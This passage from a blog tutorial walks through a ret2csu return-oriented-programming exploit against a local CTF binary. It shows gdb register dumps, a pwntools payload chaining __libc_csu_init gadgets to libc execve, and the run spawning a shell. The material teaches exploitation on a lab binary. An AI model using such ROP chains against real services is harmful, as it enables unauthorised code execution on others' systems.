</span></span></code></pre></div><p>Since, you already know the drill of attaching and continuing the process in <code>gdb</code>, I&rsquo;ll show the contents of registers:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">c</span>
</span></span><span class="line"><span class="cl"><span class="nf">Continuing.</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">Thread</span> <span class="mi">1</span> <span class="err">&#34;</span><span class="no">chall</span><span class="err">&#34;</span> <span class="no">received</span> <span class="no">signal</span> <span class="no">SIGSEGV</span><span class="p">,</span> <span class="no">Segmentation</span> <span class="no">fault.</span>
</span></span><span class="line"><span class="cl"><span class="err">[</span> <span class="nl">Legend:</span> <span class="nf">Modified</span> <span class="no">register</span> <span class="err">|</span> <span class="no">Code</span> <span class="err">|</span> <span class="no">Heap</span> <span class="err">|</span> <span class="no">Stack</span> <span class="err">|</span> <span class="no">String</span> <span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">--</span> <span class="nf">snip</span> <span class="p">--</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">─────────────────────────────────────────────────────────────────────────────────────────────</span> <span class="nf">threads</span> <span class="err">────</span>
</span></span><span class="line"><span class="cl"><span class="err">[</span><span class="c1">#0] Id 1, Name: &#34;chall&#34;, stopped 0x7ffe1b95ba00 in ?? (), reason: SIGSEGV
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">───────────────────────────────────────────────────────────────────────────────────────────────</span> <span class="nf">trace</span> <span class="err">────</span>
</span></span><span class="line"><span class="cl"><span class="err">[</span><span class="c1">#0] 0x7ffe1b95ba00 → or BYTE PTR [rdx+0x7ffe1b95], bh
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">──────────────────────────────────────────────────────────────────────────────────────────────────────────</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x00007ffe1b95ba00</span> <span class="no">in</span> <span class="err">??</span> <span class="p">()</span>
</span></span></code></pre></div><p>The registers values:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">info</span> <span class="no">registers</span>
</span></span><span class="line"><span class="cl"><span class="nf">rax</span>            <span class="mi">0x7ffe1b95b8e8</span>	<span class="mi">0x7ffe1b95b8e8</span>
</span></span><span class="line"><span class="cl"><span class="nf">rbx</span>            <span class="mi">0x0</span>	<span class="mi">0x0</span>
</span></span><span class="line"><span class="cl"><span class="nf">rcx</span>            <span class="mi">0x7fa7df2a7a00</span>	<span class="mi">0x7fa7df2a7a00</span>
</span></span><span class="line"><span class="cl"><span class="nf">rdx</span>            <span class="mi">0x7fa7df2a98d0</span>	<span class="mi">0x7fa7df2a98d0</span>
</span></span><span class="line"><span class="cl"><span class="nf">rsi</span>            <span class="mi">0x1324671</span>	<span class="mi">0x1324671</span>
</span></span><span class="line"><span class="cl"><span class="nf">rdi</span>            <span class="mi">0x7ffe1b95b8e9</span>	<span class="mi">0x7ffe1b95b8e9</span>
</span></span><span class="line"><span class="cl"><span class="nf">rbp</span>            <span class="mi">0x1</span>	<span class="mi">0x1</span>
</span></span><span class="line"><span class="cl"><span class="nf">rsp</span>            <span class="mi">0x7ffe1b95b950</span>	<span class="mi">0x7ffe1b95b950</span>
</span></span><span class="line"><span class="cl"><span class="nf">r8</span>             <span class="mi">0x13246d1</span>	<span class="mi">0x13246d1</span>
</span></span><span class="line"><span class="cl"><span class="nf">r9</span>             <span class="mi">0x7fa7df2a98d0</span>	<span class="mi">0x7fa7df2a98d0</span>
</span></span><span class="line"><span class="cl"><span class="nf">r10</span>            <span class="mi">0x7fa7df4b74c0</span>	<span class="mi">0x7fa7df4b74c0</span>
</span></span><span class="line"><span class="cl"><span class="nf">r11</span>            <span class="mi">0x246</span>	<span class="mi">0x246</span>
</span></span><span class="line"><span class="cl"><span class="nf">r12</span>            <span class="mi">0x600e38</span>	<span class="mi">0x600e38</span>
</span></span><span class="line"><span class="cl"><span class="nf">r13</span>            <span class="mi">0x601150</span>	<span class="mi">0x601150</span>
</span></span><span class="line"><span class="cl"><span class="nf">r14</span>            <span class="mi">0x0</span>	<span class="mi">0x0</span>
</span></span><span class="line"><span class="cl"><span class="nf">r15</span>            <span class="mi">0x0</span>	<span class="mi">0x0</span>
</span></span><span class="line"><span class="cl"><span class="nf">rip</span>            <span class="mi">0x7ffe1b95ba00</span>	<span class="mi">0x7ffe1b95ba00</span>
</span></span><span class="line"><span class="cl"><span class="nf">eflags</span>         <span class="mi">0x10246</span>	<span class="p">[</span> <span class="no">PF</span> <span class="no">ZF</span> <span class="no">IF</span> <span class="no">RF</span> <span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nf">cs</span>             <span class="mi">0x33</span>	<span class="mi">0x33</span>
</span></span><span class="line"><span class="cl"><span class="nf">ss</span>             <span class="mi">0x2b</span>	<span class="mi">0x2b</span>
</span></span><span class="line"><span class="cl"><span class="nf">ds</span>             <span class="mi">0x0</span>	<span class="mi">0x0</span>
</span></span><span class="line"><span class="cl"><span class="nf">es</span>             <span class="mi">0x0</span>	<span class="mi">0x0</span>
</span></span><span class="line"><span class="cl"><span class="nf">fs</span>             <span class="mi">0x0</span>	<span class="mi">0x0</span>
</span></span><span class="line"><span class="cl"><span class="nf">gs</span>             <span class="mi">0x0</span>	<span class="mi">0x0</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">x</span><span class="err">/</span><span class="no">s</span> <span class="mi">0x601150</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x601150:</span>	<span class="err">&#34;/</span><span class="nf">bin</span><span class="err">/</span><span class="no">sh</span><span class="err">&#34;</span>
</span></span></code></pre></div><p>Now, it&rsquo;s time to check the second ROP chain:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1">   0x0000000000400670 &lt;+64&gt;:	mov    rdx,r15
</span></span></span><span class="line"><span class="cl"><span class="s1">   0x0000000000400673 &lt;+67&gt;:	mov    rsi,r14
</span></span></span><span class="line"><span class="cl"><span class="s1">   0x0000000000400676 &lt;+70&gt;:	mov    edi,r13d
</span></span></span><span class="line"><span class="cl"><span class="s1">   0x0000000000400679 &lt;+73&gt;:	call   QWORD PTR [r12+rbx*8]
</span></span></span><span class="line"><span class="cl"><span class="s1">   0x000000000040067d &lt;+77&gt;:	add    rbx,0x1
</span></span></span><span class="line"><span class="cl"><span class="s1">   0x0000000000400681 &lt;+81&gt;:	cmp    rbp,rbx
</span></span></span><span class="line"><span class="cl"><span class="s1">   0x0000000000400684 &lt;+84&gt;:	jne    0x400670 &lt;__libc_csu_init+64&gt;
</span></span></span><span class="line"><span class="cl"><span class="s1">   0x0000000000400686 &lt;+86&gt;:	add    rsp,0x8
</span></span></span><span class="line"><span class="cl"><span class="s1">   0x000000000040068a &lt;+90&gt;:	pop    rbx
</span></span></span><span class="line"><span class="cl"><span class="s1">   0x000000000040068b &lt;+91&gt;:	pop    rbp
</span></span></span><span class="line"><span class="cl"><span class="s1">   0x000000000040068c &lt;+92&gt;:	pop    r12
</span></span></span><span class="line"><span class="cl"><span class="s1">   0x000000000040068e &lt;+94&gt;:	pop    r13
</span></span></span><span class="line"><span class="cl"><span class="s1">   0x0000000000400690 &lt;+96&gt;:	pop    r14
</span></span></span><span class="line"><span class="cl"><span class="s1">   0x0000000000400692 &lt;+98&gt;:	pop    r15
</span></span></span><span class="line"><span class="cl"><span class="s1">   0x0000000000400694 &lt;+100&gt;:	ret    
</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x00</span><span class="p">)</span>            <span class="c1"># add rsp,0x8 padding</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x00</span><span class="p">)</span>            <span class="c1"># rbx</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x00</span><span class="p">)</span>            <span class="c1"># rbp</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x00</span><span class="p">)</span>            <span class="c1"># r12</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x00</span><span class="p">)</span>            <span class="c1"># r13</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x00</span><span class="p">)</span>            <span class="c1"># r14</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x00</span><span class="p">)</span>            <span class="c1"># r15</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;execve&#39;</span><span class="p">])</span>
</span></span></code></pre></div><p>Well, kind of a long chain to deal with but it&rsquo;s very simple, as I already explained it but this time we are giving the input, so this is a crucial part. The explanations would be done line by line:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400670</span> <span class="err">&lt;+</span><span class="mi">64</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">rdx</span><span class="p">,</span><span class="no">r15</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400673</span> <span class="err">&lt;+</span><span class="mi">67</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">rsi</span><span class="p">,</span><span class="no">r14</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400676</span> <span class="err">&lt;+</span><span class="mi">70</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">edi</span><span class="p">,</span><span class="no">r13d</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400679</span> <span class="err">&lt;+</span><span class="mi">73</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">call</span>   <span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">r12</span><span class="err">+</span><span class="no">rbx</span><span class="p">*</span><span class="mi">8</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000040067d</span> <span class="err">&lt;+</span><span class="mi">77</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">add</span>    <span class="no">rbx</span><span class="p">,</span><span class="mi">0x1</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400681</span> <span class="err">&lt;+</span><span class="mi">81</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">cmp</span>    <span class="no">rbp</span><span class="p">,</span><span class="no">rbx</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400684</span> <span class="err">&lt;+</span><span class="mi">84</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">jne</span>    <span class="mh">0x400670</span> <span class="p">&lt;</span><span class="no">__libc_csu_init</span><span class="p">+</span><span class="mi">64</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000400686</span> <span class="err">&lt;+</span><span class="mi">86</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">add</span>    <span class="no">rsp</span><span class="p">,</span><span class="mi">0x8</span>
</span></span></code></pre></div><p>Now, the <code>mov</code> instructions will transfer the contents to registers. Previously, we gave <code>r12</code> : <code>0x600e38</code> which is an address to the <code>_init</code> pointer, here, apparently, <code>rbx</code> was <code>0</code> which means <code>[r12 + rbx * 8]</code> will be equal to <code>[0x600e38 + 0 * 8]</code> which will be <code>[0x600e38]</code>.  After that <code>rbx</code> is incremented by <code>0x1</code> which will make the <code>rbx</code> value <code>0x1</code>. Then the <code>cmp    rbp,rbx</code>, as you remember from the first chain, we provided <code>0x1</code> to <code>rbp</code> value, then it will evaluate equally since <code>rbp</code> and <code>rbx</code> both have the value of <code>0x1</code>, skipping the <code>jne</code> line. After that we have, <code>add rsp, 0x8</code>, we have to pad this instruction by giving <code>0x0</code>, after that we can give <code>0x0</code> to the popped registers as the control flow of program would take care of this.</p>
<h1 id="pwned" class="relative group">Pwned <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#pwned" aria-label="Anchor">#</a></span></h1><p>As we are done understanding the payload, it&rsquo;s time to run the final script:-</p>
<hr>
<blockquote>
<p>Note: I put a breakpoint at <code>execve</code>. This will help us to check the arguments provided to it.</p>
</blockquote>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">b</span> <span class="p">*</span><span class="no">execve</span>
</span></span><span class="line"><span class="cl"><span class="nf">Breakpoint</span> <span class="mi">1</span> <span class="no">at</span> <span class="mi">0x7fa7defa0e30</span><span class="p">:</span> <span class="no">file</span> <span class="no">..</span><span class="err">/</span><span class="no">sysdeps</span><span class="err">/</span><span class="no">unix</span><span class="err">/</span><span class="no">syscall-template.S</span><span class="p">,</span> <span class="no">line</span> <span class="mi">78</span><span class="p">.</span>
</span></span></code></pre></div><hr>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nl">d4mianwayne@oracle:</span><span class="err">~/</span><span class="nf">pwn1$</span> <span class="no">python3</span> <span class="no">xpl.py</span> 
</span></span><span class="line"><span class="cl"><span class="p">[*]</span> <span class="err">&#39;/</span><span class="no">home</span><span class="err">/</span><span class="no">d4mianwayne</span><span class="err">/</span><span class="no">pwn1</span><span class="err">/</span><span class="no">chall</span><span class="err">&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="nl">Arch:</span>     <span class="nf">amd64-64-little</span>
</span></span><span class="line"><span class="cl">    <span class="nl">RELRO:</span>    <span class="nf">Partial</span> <span class="no">RELRO</span>
</span></span><span class="line"><span class="cl">    <span class="nl">Stack:</span>    <span class="nf">No</span> <span class="no">canary</span> <span class="no">found</span>
</span></span><span class="line"><span class="cl">    <span class="nl">NX:</span>       <span class="nf">NX</span> <span class="no">enabled</span>
</span></span><span class="line"><span class="cl">    <span class="nl">PIE:</span>      <span class="nf">No</span> <span class="no">PIE</span> <span class="p">(</span><span class="mi">0x400000</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="err">&#39;/</span><span class="nf">lib</span><span class="err">/</span><span class="no">x86_64-linux-gnu</span><span class="err">/</span><span class="no">libc-2.27.so</span><span class="err">&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="nl">Arch:</span>     <span class="nf">amd64-64-little</span>
</span></span><span class="line"><span class="cl">    <span class="nl">RELRO:</span>    <span class="nf">Partial</span> <span class="no">RELRO</span>
</span></span><span class="line"><span class="cl">    <span class="nl">Stack:</span>    <span class="nf">Canary</span> <span class="no">found</span>
</span></span><span class="line"><span class="cl">    <span class="nl">NX:</span>       <span class="nf">NX</span> <span class="no">enabled</span>
</span></span><span class="line"><span class="cl">    <span class="nl">PIE:</span>      <span class="nf">PIE</span> <span class="no">enabled</span>
</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">Starting</span> <span class="no">local</span> <span class="no">process</span> <span class="err">&#39;</span><span class="p">.</span><span class="err">/</span><span class="no">chall</span><span class="err">&#39;</span><span class="p">:</span> <span class="no">pid</span> <span class="mi">15085</span>
</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">puts@libc</span> <span class="p">:</span> <span class="mi">0x7f09dd95e9c0</span>
</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">libc</span>      <span class="p">:</span> <span class="mi">0x7f09dd8de000</span>
</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="err">&#39;/</span><span class="nf">bin</span><span class="err">/</span><span class="no">sh</span><span class="err">&#39;</span> <span class="p">:</span> <span class="mi">6295888</span>
</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Paused</span> <span class="p">(</span><span class="no">press</span> <span class="no">any</span> <span class="no">to</span> <span class="no">continue</span><span class="p">)</span>
</span></span></code></pre></div><p>Now, we will attach the process, and continue:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">b</span> <span class="p">*</span><span class="no">execve</span>
</span></span><span class="line"><span class="cl"><span class="nf">Breakpoint</span> <span class="mi">1</span> <span class="no">at</span> <span class="mi">0x7f09dd9c2e30</span><span class="p">:</span> <span class="no">file</span> <span class="no">..</span><span class="err">/</span><span class="no">sysdeps</span><span class="err">/</span><span class="no">unix</span><span class="err">/</span><span class="no">syscall-template.S</span><span class="p">,</span> <span class="no">line</span> <span class="mi">78</span><span class="p">.</span>
</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">c</span>
</span></span><span class="line"><span class="cl"><span class="nf">Continuing.</span>
</span></span><span class="line"><span class="cl"><span class="err">[</span> <span class="nl">Legend:</span> <span class="nf">Modified</span> <span class="no">register</span> <span class="err">|</span> <span class="no">Code</span> <span class="err">|</span> <span class="no">Heap</span> <span class="err">|</span> <span class="no">Stack</span> <span class="err">|</span> <span class="no">String</span> <span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">--</span> <span class="nf">snip</span> <span class="p">--</span> 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">─────────────────────────────────────────────────────────────────────────────────────────────</span> <span class="no">threads</span> <span class="err">────</span>
</span></span><span class="line"><span class="cl"><span class="err">[</span><span class="c1">#0] Id 1, Name: &#34;chall&#34;, stopped 0x7f09dd9c2e30 in execve (), reason: BREAKPOINT
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">───────────────────────────────────────────────────────────────────────────────────────────────</span> <span class="nf">trace</span> <span class="err">────</span>
</span></span><span class="line"><span class="cl"><span class="err">[</span><span class="c1">#0] 0x7f09dd9c2e30 → execve()
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="err">──────────────────────────────────────────────────────────────────────────────────────────────────────────</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">Breakpoint</span> <span class="mi">1</span><span class="p">,</span> <span class="no">execve</span> <span class="p">()</span> <span class="no">at</span> <span class="no">..</span><span class="err">/</span><span class="no">sysdeps</span><span class="err">/</span><span class="no">unix</span><span class="err">/</span><span class="no">syscall-template.S</span><span class="p">:</span><span class="mi">78</span>
</span></span><span class="line"><span class="cl"><span class="err">78</span>	<span class="nf">..</span><span class="err">/</span><span class="no">sysdeps</span><span class="err">/</span><span class="no">unix</span><span class="err">/</span><span class="no">syscall-template.S</span><span class="p">:</span> <span class="no">No</span> <span class="no">such</span> <span class="no">file</span> <span class="no">or</span> <span class="no">directory.</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">x</span><span class="err">/</span><span class="no">s</span> <span class="no">$rdi</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x601150:</span>	<span class="err">&#34;/</span><span class="nf">bin</span><span class="err">/</span><span class="no">sh</span><span class="err">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">x</span><span class="err">/</span><span class="no">x</span> <span class="no">$rdx</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x0:</span>	<span class="nf">Cannot</span> <span class="no">access</span> <span class="no">memory</span> <span class="no">at</span> <span class="no">address</span> <span class="mi">0x0</span>
</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">x</span><span class="err">/</span><span class="no">x</span> <span class="no">$rsi</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x0:</span>	<span class="nf">Cannot</span> <span class="no">access</span> <span class="no">memory</span> <span class="no">at</span> <span class="no">address</span> <span class="mi">0x0</span>
</span></span></code></pre></div><p>Cool, now let&rsquo;s continue the execution:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">c</span>
</span></span><span class="line"><span class="cl"><span class="nf">Continuing.</span>
</span></span><span class="line"><span class="cl"><span class="nf">process</span> <span class="mi">15085</span> <span class="no">is</span> <span class="no">executing</span> <span class="no">new</span> <span class="no">program</span><span class="p">:</span> <span class="err">/</span><span class="no">bin</span><span class="err">/</span><span class="no">dash</span>
</span></span></code></pre></div><p>It seems like we spawned a shell, let&rsquo;s get back to the script:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nl">d4mianwayne@oracle:</span><span class="err">~/</span><span class="nf">pwn1$</span> <span class="no">python3</span> <span class="no">xpl.py</span> 
</span></span><span class="line"><span class="cl"><span class="p">[*]</span> <span class="err">&#39;/</span><span class="no">home</span><span class="err">/</span><span class="no">d4mianwayne</span><span class="err">/</span><span class="no">pwn1</span><span class="err">/</span><span class="no">chall</span><span class="err">&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="nl">Arch:</span>     <span class="nf">amd64-64-little</span>
</span></span><span class="line"><span class="cl">    <span class="nl">RELRO:</span>    <span class="nf">Partial</span> <span class="no">RELRO</span>
</span></span><span class="line"><span class="cl">    <span class="nl">Stack:</span>    <span class="nf">No</span> <span class="no">canary</span> <span class="no">found</span>
</span></span><span class="line"><span class="cl">    <span class="nl">NX:</span>       <span class="nf">NX</span> <span class="no">enabled</span>
</span></span><span class="line"><span class="cl">    <span class="nl">PIE:</span>      <span class="nf">No</span> <span class="no">PIE</span> <span class="p">(</span><span class="mi">0x400000</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="err">&#39;/</span><span class="nf">lib</span><span class="err">/</span><span class="no">x86_64-linux-gnu</span><span class="err">/</span><span class="no">libc-2.27.so</span><span class="err">&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="nl">Arch:</span>     <span class="nf">amd64-64-little</span>
</span></span><span class="line"><span class="cl">    <span class="nl">RELRO:</span>    <span class="nf">Partial</span> <span class="no">RELRO</span>
</span></span><span class="line"><span class="cl">    <span class="nl">Stack:</span>    <span class="nf">Canary</span> <span class="no">found</span>
</span></span><span class="line"><span class="cl">    <span class="nl">NX:</span>       <span class="nf">NX</span> <span class="no">enabled</span>
</span></span><span class="line"><span class="cl">    <span class="nl">PIE:</span>      <span class="nf">PIE</span> <span class="no">enabled</span>
</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">Starting</span> <span class="no">local</span> <span class="no">process</span> <span class="err">&#39;</span><span class="p">.</span><span class="err">/</span><span class="no">chall</span><span class="err">&#39;</span><span class="p">:</span> <span class="no">pid</span> <span class="mi">15085</span>
</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">puts@libc</span> <span class="p">:</span> <span class="mi">0x7f09dd95e9c0</span>
</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">libc</span>      <span class="p">:</span> <span class="mi">0x7f09dd8de000</span>
</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="err">&#39;/</span><span class="nf">bin</span><span class="err">/</span><span class="no">sh</span><span class="err">&#39;</span> <span class="p">:</span> <span class="mi">6295888</span>
</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Paused</span> <span class="p">(</span><span class="no">press</span> <span class="no">any</span> <span class="no">to</span> <span class="no">continue</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Switching</span> <span class="no">to</span> <span class="no">interactive</span> <span class="no">mode</span>
</span></span><span class="line"><span class="cl"><span class="nf">$</span> <span class="no">whoami</span>
</span></span><span class="line"><span class="cl"><span class="nf">d4mianwayne</span>
</span></span><span class="line"><span class="cl"><span class="nf">$</span> <span class="no">id</span>
</span></span><span class="line"><span class="cl"><span class="nf">uid</span><span class="err">=</span><span class="mi">1000</span><span class="p">(</span><span class="no">d4mianwayne</span><span class="p">)</span> <span class="no">gid</span><span class="err">=</span><span class="mi">1000</span><span class="p">(</span><span class="no">d4mianwayne</span><span class="p">)</span> <span class="no">groups</span><span class="err">=</span><span class="mi">1000</span><span class="p">(</span><span class="no">d4mianwayne</span><span class="p">),</span><span class="mi">4</span><span class="p">(</span><span class="no">adm</span><span class="p">),</span><span class="mi">24</span><span class="p">(</span><span class="no">cdrom</span><span class="p">),</span><span class="mi">27</span><span class="p">(</span><span class="no">sudo</span><span class="p">),</span><span class="mi">30</span><span class="p">(</span><span class="no">dip</span><span class="p">),</span><span class="mi">46</span><span class="p">(</span><span class="no">plugdev</span><span class="p">),</span><span class="mi">116</span><span class="p">(</span><span class="no">lpadmin</span><span class="p">),</span><span class="mi">126</span><span class="p">(</span><span class="no">sambashare</span><span class="p">),</span><span class="mi">129</span><span class="p">(</span><span class="no">libvirt</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nf">$</span> 
</span></span><span class="line"><span class="cl"><span class="p">[*]</span> <span class="no">Interrupted</span>
</span></span></code></pre></div><p>Awesome, we did it. Congratulations, you finally made it to end which means you learned the <code>ret2csu</code> to some extent. I&rsquo;d recommend you try it on yourself and mess around with <code>gdb</code>.</p>

      </div>
    </section>
    <footer class="max-w-prose pt-8 print:hidden">
      
  <div class="flex">
    
    
    
    <div class="place-self-center">
      
      
      <div class="text-2xl sm:text-lg">
</div>
    </div>
  </div>


      

      
  
    
    
    
    <div class="pt-8">
      <hr class="border-dotted border-neutral-300 dark:border-neutral-600" />
      <div class="flex justify-between pt-3">
        <span>
          
            <a class="group flex" href="/blog/zer0pts-hipwn/">
              <span
                class="me-2 text-neutral-700 transition-transform group-hover:-translate-x-[2px] group-hover:text-primary-600 dark:text-neutral dark:group-hover:text-primary-400"
                ><span class="ltr:inline rtl:hidden">&larr;</span
                ><span class="ltr:hidden rtl:inline">&rarr;</span></span
              >
              <span class="flex flex-col">
                <span
                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
                  >zer0ptsCTF - Hipwn Challenge</span
                >
                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
                  
                    <time datetime="2020-03-09 00:00:00 &#43;0000 UTC">9 March 2020</time>
                  
                </span>
              </span>
            </a>
          
        </span>
        <span>
          
            <a class="group flex text-right" href="/blog/hacktivitycon-pwn/">
              <span class="flex flex-col">
                <span
                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
                  >Hacktivitycon - Pwn challenges</span
                >
                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
                  
                    <time datetime="2020-08-01 00:00:00 &#43;0000 UTC">1 August 2020</time>
                  
                </span>
              </span>
              <span
                class="ms-2 text-neutral-700 transition-transform group-hover:-translate-x-[-2px] group-hover:text-primary-600 dark:text-neutral dark:group-hover:text-primary-400"
                ><span class="ltr:inline rtl:hidden">&rarr;</span
                ><span class="ltr:hidden rtl:inline">&larr;</span></span
              >
            </a>
          
        </span>
      </div>
    </div>
  


      
    </footer>
  </article>

        
          <div class="pointer-events-none absolute bottom-0 end-0 top-[100vh] w-12">
            <a
              href="#the-top"
              class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 backdrop-blur hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
              aria-label="Scroll to top"
              title="Scroll to top"
            >
              &uarr;
            </a>
          </div>
        
      </main><footer class="py-10 print:hidden">
  
  
  <div class="flex items-center justify-between">
    <div>
      
      
        <p class="text-sm text-neutral-500 dark:text-neutral-400">
            &copy;
            2024
            
        </p>
      
      
      
        <p class="text-xs text-neutral-500 dark:text-neutral-400">
          
          
          Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
            href="https://gohugo.io/" target="_blank" rel="noopener noreferrer">Hugo</a> &amp; <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500" href="https://github.com/jpanther/congo" target="_blank" rel="noopener noreferrer">Congo</a>
        </p>
      
    </div>
    <div class="flex flex-row items-center">
      
      
      
      
    </div>
  </div>
  
  
</footer>

    </div>
  </body>
</html>
